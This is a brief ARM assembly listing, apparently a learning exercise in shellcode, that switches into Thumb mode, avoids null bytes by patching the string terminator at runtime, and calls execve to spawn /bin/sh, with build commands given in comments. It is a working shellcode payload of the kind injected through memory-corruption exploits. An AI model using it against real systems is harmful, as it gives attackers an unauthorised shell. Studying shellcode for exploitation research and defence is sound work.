/*Remove null bytes to run syscall of bin/bash using thumb mode*/

/*linking*/
/*as system.s -o system.o && ld -N system.o -o system*/

.section .text
.global _start

_start:
	.code	 32	@normal mode
	add	r3, pc, #1 @force thumb mode
	bx	r3

	.code 16	@thumb mode
	add r0, pc, #8 	@must be 4 bytes aligned
	eor r1, r1, r1  @exclusive ors
	eor r2, r2, r2
	strb r2, [r0, #7] @writes null bytes at end of bin/sh
	mov r7, #11
	svc #1

.ascii "/bin/shx"
